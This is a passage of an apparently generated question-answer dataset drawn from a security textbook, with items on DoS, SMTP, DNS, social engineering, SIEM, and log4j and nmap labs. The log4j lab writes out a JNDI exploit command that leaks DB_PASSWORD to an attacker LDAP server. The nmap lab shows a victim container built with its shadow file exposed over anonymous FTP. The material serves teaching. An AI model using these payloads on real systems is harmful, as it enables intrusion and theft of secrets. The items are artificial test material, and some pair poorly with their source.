intrusion, primarily used to determine if a system has been compromised.", "question_token_count": 22, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 12, "choices": null}
{"context": "### 5.6.3. Denial of Service (DoS) {#_computer_systems_security_planning_for_success.xhtml__denial_of_service_dos}\nA denial of service attack (Dos) attempts to keep a system from working by overwhelming it with requests. A distributed\n\ndenial of service attack (DDoS) does the same thing by utilizing many different machines. Typically the attacking nodes\n\nfor a DDoS attack are members of a botnet, machines that have been exploited previously and are under the attackers\n\ncontrol.\n\nDoS attacks can take many forms including:\n\n::: description-list\n\n[SYN Floods]{.term}\n\n:   [A malicious actor can send multiple SYN packets to initiate the TCP three-way handshake. SYN packets are easy to\n\n    send, but may cause significant resources to be allocated on the server responding to them. Due to the asymettric\n\n    nature of resource allocation this makes the use of SYN packets particularly suited to DoS attack. [SYN\n\n    cookies](https://en.wikipedia.org/wiki/SYN_cookies){.link} can be used to help prevent this kind of\n\n    attack.]{.principal}\n\n[ICMP Floods]{.term}\n\n:   [Often referred to as pinging, ICMP echo requests can be used to overwhelm a server. Especially when sent from\n\n    multiple sources. The solution is typically to rate limit ICMP packets on the server.]{.principal}\n\n[Buffer Overflows/Exploits]{.term}\n\n:   [Poorly designed software may fail when it receives unexpected data. This could be something as simple as sending\n\n    more data than a buffer can hold, or [setting the urgent pointer (URG) on a packet destined for port 139 of a\n\n    Windows system](https://en.wikipedia.org/wiki/WinNuke){.link}.]{.principal}\n\n:::\n\n<aside class=\"sidebar titled\" title=\"Remote Shells\" epub:type=\"sidebar\">\n", "topic": "Explain how SYN floods contribute to DoS attacks, including the asymmetric resource allocation involved.", "question": "How does the asymmetric resource allocation inherent in SYN flood attacks contribute to their effectiveness as a denial-of-service mechanism?", "answer": "The server consumes resources while the attacker does not.", "explanation": "The server allocates resources to respond to SYN packets, while the attacker generates a large volume of these packets with minimal resource expenditure on their end.", "question_token_count": 23, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 11, "choices": null}
{"context": "### 4.4.12. SMTP {#_computer_systems_security_planning_for_success.xhtml__smtp}\nSimple Mail Transfer Protocol is used for sending/forwarding email. As it states, it is a simple protocol consisting of\n\nlines of text. Basic SMTP used TCP on port 25. SMTP was later expanded to support authentication and finally wrapped in\n\nTLS still using TCP on port 587. SMTP servers accept outgoing mail from (hopefully) authenticated clients, route mail to\n\nother SMTP servers based on the Mail Exchange (MX) information in DNS records, and accept mail for their domain from\n\nother SMTP servers. Various checks have been implemented in SMTP servers to ensure that messages from domains *actually*\n\ncome from those domains. This is largely used to combat spam, which continues to be a problem.\n\n:::\n\n::: {.section .sect3 title=\"4.4.13. NTP\"}\n\n\n### 4.4.13. NTP {#_computer_systems_security_planning_for_success.xhtml__ntp}\nNetwork Time Protocol uses UDP over port 123 to sync the system time with a time server. NTP servers are layered in\n\nstratums, with the lowest stratums being closest to the most accurate sources of time, atomic clocks, GPS, etc. NTP is\n\nimportant as many protocols, including several key exchanges, require system clocks to be in sync. System clocks are\n\nalso used to check when certificates expire and used in logs to indicate when something happened. Without an accurate,\n\nsynchronized system clock many things will fail in surprising ways.\n\n:::\n\n::: {.section .sect3 title=\"4.4.14. FTP\"}\n", "topic": "Explain the evolution of SMTP, detailing the changes from basic TCP/port 25 to the inclusion of authentication and TLS on port 587.", "question": "What were the key changes implemented in the Simple Mail Transfer Protocol (SMTP) to address the growing problem of spam, and how did these changes affect the protocol\u2019s operational mechanisms?", "answer": "Authentication and TLS on port 587.", "explanation": "The answer correctly identifies the progression from basic TCP/port 25, to authentication, and finally TLS on port 587, reflecting the stated evolution described in the text.", "question_token_count": 36, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 6, "question_groundedness_score": 10, "avg_answer_token_count": 9, "choices": null}
{"context": "### 3.5.4. Shoulder Surfing {#_computer_systems_security_planning_for_success.xhtml__shoulder_surfing}\nPINs, passwords, and other data can also recovered simply by looking over someone's shoulder. These credentials could be\n\nthe \\\"in\\\" that an attacker needs to spread malware. Through the aid of optics, such a binoculars, shoulder surfing can\n\neven occur at a long distance. Privacy screens, which limit the angle at which you can see a monitor, can be helpful in\n\nmitigating this type of attack.\n\n:::\n\n::: {.section .sect3 title=\"3.5.5. Tailgating\"}\n\n\n### 3.5.5. Tailgating {#_computer_systems_security_planning_for_success.xhtml__tailgating}\nFollowing behind someone who is entering a secure location with a credential is known as tailgating. Often people will\n\neven hold secure doors open for someone if they have their hands full. It is human nature to want to help people, but\n\nyou also must remember that the person behind you may have a USB key with malware ready to deploy as soon as they gain\n\nphysical access to a machine in the building.\n\n:::\n\n::: {.section .sect3 title=\"3.5.6. Impersonation/Identity Theft\"}\n", "topic": "What are the potential consequences of successful shoulder surfing, and how might an attacker leverage recovered credentials?", "question": "Beyond simply recovering credentials, what specific operational impact could an attacker achieve following a successful shoulder surfing attack, and how might this impact a larger organization\u2019s security posture?", "answer": "Spreading malware throughout the organization.", "explanation": "The text states that recovered credentials could be \u201cthe \u2018in\u2019 that an attacker needs to spread malware.\u201d This implies a wider operational impact beyond just gaining access to a single account.", "question_token_count": 33, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 8, "choices": null}
{"context": "### 4.4.9. DNS {#_computer_systems_security_planning_for_success.xhtml__dns}\nDomain Name System (DNS) is used to resolve domain names to IP addresses. Domain names are the simple names people are\n\naccustomed to for websites, such as `njit.edu`{.literal} as opposed to `54.83.189.142`{.literal}. Names are\n\nsignificantly easier for people to remember than IP addresses. In order for a computer to resolve a name, it first\n\nqueries a local cache, then its primary DNS server. Assuming the DNS server cannot find the name it will query a Root\n\nserver for a Top Level Domain (TLD) server, which maintains a listing of Authoritative Nameservers for that particular\n\ndomain (edu, com, net, org, gov, etc.). Finally once an authoritative nameserver is found it will respond with the IP\n\naddress for that particular hostname which will be cached and sent back through the user's primary DNS server to the\n\nuser.\n\nDNS is designed to be resilient and decentralized but unfortunately the traffic is not authenticated or encrypted. This\n\nhas made it a target for MitM attacks. Likewise cache hits and misses [can yield information as to what names have been\n\nrecently resolved](https://kb.isc.org/docs/aa-00509){.link} (as was the case in discovering the extent of the Sony\n\nRootkit). The recursive nature has of DNS has also allowed for DoS attacks in the past, but much of that has been solved\n\nby limiting recursive queries to the user-facing DNS servers (ie. the one given to you by your DHCP request). DNS\n\noperates via UDP (and occasionally TCP) on port 53.\n\n:::\n\n::: {.section .sect3 title=\"4.4.10. DNSSEC\"}\n", "topic": "Detail how DNS caching mechanisms contribute to both performance and potential security risks, referencing the historical discovery of the Sony Rootkit.", "question": "How did the DNS caching mechanism, specifically its recursive nature, contribute to the discovery of the Sony Rootkit, and what broader security implications does this historical event highlight regarding DNS architecture?", "answer": "Cache hits and misses can reveal recently resolved names.", "explanation": "The text explicitly states that cache hits and misses can reveal recently resolved names, as demonstrated in the discovery of the extent of the Sony Rootkit. This reveals how DNS caching, while beneficial for performance, can be leveraged for reconnaissance, illustrating a critical security vulnerability.", "question_token_count": 37, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 7, "question_groundedness_score": 9, "avg_answer_token_count": 11, "choices": null}
{"context": "## 6.8. SIEM {#_computer_systems_security_planning_for_success.xhtml__siem}\n::: float-group\n\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/seim.svg\" alt=\"seim\" />\n\n</div>\n\n</figure>\n\nSecurity and Information Event management is a system for real-time monitoring of security information. Typically a SIEM\n\nsystem presents a dashboard showing events and has the ability to generate reports or create tickets. It may be separate\n\ndevice, software on an internal device, or even a third party service. Some examples of popular SIEMs are QRadar,\n\nSplunk, and Azure Sentinel.\n\n:::\n\n::::\n\n::::::::::: {.section .sect2 title=\"6.9. Lab: Exploiting log4j\"}\n\n\n## 6.9. Lab: Exploiting log4j {#_computer_systems_security_planning_for_success.xhtml__lab_exploiting_log4j}\nIn this lab we will examine the log4j vulnerability,\n\n[CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228){.link}. This vulnerability takes advantage of a flaw\n\nin a common logging library used by many Java applications, including Apache, neo4j, Steam, iCloud, and Minecraft. Any\n\nattacker that can cause a message to be logged can use the Java Naming and Directory Interface (JNDI) and cause the\n\ntarget to reach out to another server, LDAP in our example, and load a remote Java class file. This file can contain any\n\ncode that the attacker wishes to inject into the server process.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nDo some research: What versions of log4j are affected by this vulnerability?\n\n:::\n\n</aside>\n\nThis lab uses a Docker Compose configuration to simulate a network with an attacker and a target. The target runs a\n\n[known-vulnerable, example application](https://github.com/leonjza/log4jpwn){.link} written by leonjza. This example\n\napplication logs the `User-Agent`{.literal} header, request path, and a query string parameter of a request as seen\n\nbelow:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>package com.sensepost.log4jpwn;\n\nimport org.apache.logging.log4j.Logger;\n\nimport org.apache.logging.log4j.LogManager;\n\nimport static spark.Spark.*;\n\npublic class App {\n\n    static final Logger logger = LogManager.getLogger(App.class.getName());\n\n    public static void main(String[] args) {\n\n        port(8080);\n\n        get(&quot;/*&quot;, (req, res) -&gt; {\n\n            String ua = req.headers(&quot;User-Agent&quot;);\n\n            String pwn = req.queryParams(&quot;pwn&quot;);\n\n            String pth = req.pathInfo();\n\n            System.out.println(&quot;logging ua: &quot; + ua);\n\n            System.out.println(&quot;logging pwn: &quot; + pwn);\n\n            System.out.println(&quot;logging pth: &quot; + pth);\n\n            // trigger\n\n            logger.error(ua);\n\n            logger.error(pwn);\n\n            logger.error(pth);\n\n            return &quot;ok: ua: &quot; + ua + &quot; &quot; + &quot;pwn: &quot; + pwn + &quot; pth:&quot; + pth;\n\n        });\n\n    }\n\n}</code></pre>\n\n<figcaption>Listing 13. App.java</figcaption>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat port does our vulnerable app run on?\n\n:::\n\n</aside>\n\nOur attacker container has [the `pwn.py`{.literal}\n\nscript](https://github.com/leonjza/log4jpwn/blob/master/pwn.py){.link}, also by leonjza, which does two things:\n\n::: {.ordered-list .arabic}\n\n1.  [Runs a fake LDAP server in the background on port 8888]{.principal}\n\n2.  [Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak]{.principal}\n\n3.  [Parses and prints the response]{.principal}\n\n:::\n\nUsing this setup we can show how log4j can be used to leak sensitive information from running processes. We will use it\n\nto leak the value of the environment variable `DB_PASSWORD`{.literal}. As it isn't uncommon to store secrets in\n\nenvironment variables on running containers, this should suffice to see just how devastating this exploit can be.\n\nStart by downloading [the zip archive of this\n\nlab](https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true){.link} and unzipping it in a directory where\n\nyou have write permissions and can navigate to in a terminal application. Once you've done that, you can bring the lab\n\nup by typing `docker-compose up`{.literal} in that directory. Output should look similar to what you see below:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\it230\\labs\\log4j&gt; docker-compose up\n\n[+] Running 2/0\n\n - Container log4j-target-1    Created                                                            0.0s\n\n - Container log4j-attacker-1  Created                                                            0.0s\n\nAttaching to log4j-attacker-1, log4j-target-1\n\nlog4j-attacker-1 exited with code 0\n\nlog4j-target-1    | WARNING: sun.reflect.Reflection.getCallerClass is not supported. This will impact performance.\n\nlog4j-target-1    | [Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @815ms to org.eclipse.jetty.util.log.Slf4jLog\n\nlog4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...\n\nlog4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - &gt;&gt; Listening on 0.0.0.0:8080\n\nlog4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.z-SNAPSHOT; built: 2019-04-29T20:42:08.989Z; git: e1bc35120a6617ee3df052294e433f3a25ce7097; jvm 11.0.14+9-post-Debian-1deb11u1\n\nlog4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0\n\nlog4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults\n\nlog4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms\n\nlog4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}\n\nlog4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms</code></pre>\n\n</figure>\n\nYou'll notice that the `target`{.literal} service is up and running the `log4jpwn`{.literal} example application and\n\nthat its output goes straight to the screen. The `attacker`{.literal} service will exit immediately as it is meant for\n\ninteractive use and doesn't run anything in the background. In another terminal, navigate to the lab directory again and\n\nrun `docker-compose run attacker bash`{.literal}. This will be the shell that you use to attack the target:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\it230\\labs\\log4j&gt; docker-compose run attacker bash\n\nroot@3971c61303c8:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice how the prompt changes once we are in the container\n\n:::\n\nIn the attack shell, use the `ip`{.literal} command to determine the IPv4 address of your container. We will need this\n\nsince the `attacker`{.literal} container will be listening for connections from `target`{.literal} once the exploit\n\nstring is logged.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@3971c61303c8:/# ip addr show dev eth0\n\n58: eth0@if59: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet &lt;IP_ADDRESS&gt;/16 brd 172.20.255.255 scope global eth0 \u2460\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* You're IP is *not* `<IP_ADDRESS>`{.literal} it is whatever you find in its place!\n\n:::\n\nOnce you have the IP address, you can run the `pwn.py`{.literal} script on the `attacker`{.literal} container and you\n\nshould be able to read the `DB_PASSWORD`{.literal} environment variable on the `target`{.literal} container.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@3971c61303c8:/# python /pwn.py --listen-host &lt;IP_ADDRESS&gt; --exploit-host &lt;IP_ADDRESS&gt; --target http://target:8080 --leak &#39;${env:DB_PASSWORD}&#39; \u2460\n\n i| starting server on &lt;IP_ADDRESS&gt;:8888\n\n i| server started\n\n i| setting payload in User-Agent header\n\n i| sending exploit payload ${jndi:ldap://&lt;IP_ADDRESS&gt;:8888/${env:DB_PASSWORD}} to http://target:8080/\n\n i| new connection from &lt;TARGETS_IP&gt;:44050\n\n v| extracted value: &lt;DB_PASSWORD&gt; \u2461\n\n i| request url was: http://target:8080/\n\n i| response status code: 200</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Docker Compose will resolve service names to IP addresses so the target URI doesn't require finding an IP\n\n2.  *\u2461* The value of `DB_PASSWORD`{.literal} can will be here.\n\n:::\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat is the database password?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat steps would you take to mitigate the risk of a deployed application having this vulnerability?\n\n:::\n\n</aside>\n\n:::::::::::\n\n:::: {.section .sect2 title=\"6.10. Review Questions\"}\n", "topic": "The lab highlights the importance of monitoring security information and events through a SIEM system, as demonstrated by the dashboard and report generation capabilities of the described SIEM.", "question": "Considering the log4j vulnerability and the way it leverages JNDI to execute remote code, describe a scenario where a compromised system, running a vulnerable application, could be used as a stepping stone to gain access to other systems within a network.", "answer": "A compromised system with a vulnerable application running could be used to launch a network scan, identifying other systems with the same vulnerability, ultimately leading to a wider breach.", "explanation": "The log4j vulnerability allows an attacker to execute arbitrary code by logging a specially crafted JNDI URI. A compromised system could be used to initiate a connection to a malicious LDAP server, which then executes the attacker's code. This code could then be used to scan the network for other vulnerable systems, escalating the attack.", "question_token_count": 50, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 33, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding the concept of rDNS and its role in network security.", "question": "Explain the purpose of Reverse DNS (rDNS) and describe a scenario where understanding rDNS would be crucial for a security professional investigating a potential network compromise.", "answer": "rDNS maps an IP address to a domain name, aiding in identifying the owner of a server/device.", "explanation": "Reverse DNS maps an IP address to a domain name. This is useful for identifying the owner of a server or device, which can aid in investigations and threat intelligence.  In a compromise scenario, knowing the rDNS record associated with an infected machine can reveal information about the organization it belongs to, potentially leading to further reconnaissance or targeting of related systems.", "question_token_count": 32, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 9, "question_groundedness_score": 4, "avg_answer_token_count": 22, "choices": null}
